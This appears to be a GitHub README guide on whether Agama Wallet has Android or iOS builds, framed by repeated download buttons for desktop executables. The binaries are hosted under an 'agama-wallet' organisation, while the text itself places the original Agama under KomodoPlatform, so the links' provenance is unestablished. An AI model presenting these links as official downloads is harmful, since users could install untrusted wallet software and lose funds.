[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Agama Wallet on Android and iOS

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

The Agama Wallet download page advertises an Android APK and shows iOS buttons, while the site's own source carries the string "Mobile download coming soon". No app store listing was verified during this research. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and its mobile availability is unresolved rather than simply undocumented.

## You'll see this if

You are on a phone, you found the download page, and it offers you a build the site elsewhere says does not exist yet.

| Claim on the site | Where it appears | What it means |
|---|---|---|
| "APK download available" | Download page | A direct Android file is offered |
| "Mobile download coming soon" | Page source | The same page contradicts the first |
| iOS buttons | Download page | Links are shown; no listing was verified |
| Desktop builds 0.3.7 | GitHub release | The only distribution that is unambiguous |

## Why it happens

Mobile distribution is a different problem from desktop distribution. A desktop build is a file; a mobile build is normally an app store listing, a signed package, or both. Without a store listing, an Android app has to be installed from a file, which puts the verification burden entirely on the user.

That is why the contradiction matters more than it looks. "Coming soon" suggests the build is not ready; "APK available" suggests a file exists to install. Both can be true of different things  -  an old build and a new plan  -  but nothing on the page says which.

There is also a historical layer. The Komodo-era Agama Mobile reached version 0.1.7 on 2019-05-29, and its APK is still published under the KomodoPlatform organisation. That is a different app from the current beta, and it is the one that older guides describe.

## Fix

Treat mobile as unresolved and act accordingly.

1. **Establish which app you are being offered.** The 2019 Komodo mobile app and the current beta are different products with different provenance.
2. **Prefer a store listing over a direct file.** A listing has a publisher identity attached; an APK from a page does not.
3. **Check whether a listing exists before installing anything.** If none is verified, the file has no publisher check behind it.
4. **Do not sideload to "try it".** An unverified mobile build has the same access to your device as a verified one.
5. **If you need mobile custody now**, use a wallet whose distribution is unambiguous rather than waiting on a page that contradicts itself.

If you already run the desktop wallet, [restoring an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) covers moving access to another device legitimately.

## If that did not work

If an APK will not install, the package may be unsigned for your Android version or built for a different architecture. That is a technical block, not a safety signal either way.

If an installed app asks for your phrase to "sync", it is not a wallet. No legitimate mobile wallet needs the phrase to be typed anywhere but its own restore screen.

If the app shows an empty wallet after restore, the cause is derivation or address range; [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) covers the order of checks.

If a page offers an iOS build with no store link, there is nothing to verify and nothing to install legitimately. An iOS app cannot be sideloaded without a developer certificate, so a button without a listing is not a distribution channel at all.

## Prevention

- **Wait for a listing rather than a file.** Publisher identity is the only mobile check that scales.
- **Do not install from mirrors.** [Agama Wallet download](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md) covers what the page offers and what is missing.
- **Keep mobile balances small.** A phone is the most lost device you own.
- **Read the contradiction as information.** A page that disagrees with itself has not settled its own release.
- **Check the product, not just the platform.** [What Agama Wallet is](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md) separates the generations.

## What the project says is coming

The project states that a mobile build is part of the next version, alongside the requirements work and release notes (recorded 2026-11-13). Two items promised alongside it have since shipped in 0.3.7  -  a release page and a published hash value per file  -  but mobile has not: the release contains desktop files only.

What that changes is the shape of the decision. A reader who needs the wallet on a phone now is still choosing between an unverified file and waiting; a reader who can wait has been told a build is intended, which is more than the download page's contradictory pair of sentences says.

Treat it as a plan with no artefact behind it. When a build ships, the test is the one below: a single accurate statement on the site, and a file or listing that matches it.

## FAQ

### Is there an Agama Wallet mobile app?

The site advertises Android and iOS while also saying mobile download is coming soon. Until one of those is resolved, availability is unverified rather than confirmed.

### What is Agama Mobile 0.1.7?

The Komodo-era mobile app, last released on 2019-05-29. Its APK is published under the KomodoPlatform organisation and is a different product from the current beta.

### Can I install the APK safely?

An APK installed outside a store has no publisher verification. A file offered outside the release has no published hash value to compare it against.

### Is the APK the same build as the desktop version?

Nothing published says so. A shared version number would be a start, but there is no mobile file in the release to compare against the desktop builds, so treating them as one product is an assumption rather than a fact.

### Why does mobile matter for a wallet like this?

Because a desktop-first wallet leaves phone users with no verified option, and an unverified APK is exactly where a counterfeit build would appear. The gap is a distribution problem with a security consequence, not a convenience issue.

### What would make mobile trustworthy enough to use?

Three things together: a listing that identifies the publisher, a published checksum for any direct file, and version numbering that matches the desktop build. Any one alone leaves a gap, and none of the three exists for a phone build today.

### Would an App Store listing settle it?

It would settle publisher identity, which is the part a direct file cannot provide. It would not settle whether the app matches the desktop build, which needs the app's own source or a published value for its file.

### Does the mobile app support swaps?

That cannot be answered from the sources available: the current beta's mobile build is unverified, and the 2019 app predates the current interface.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet Download and Install: What Is Available](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md)
- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
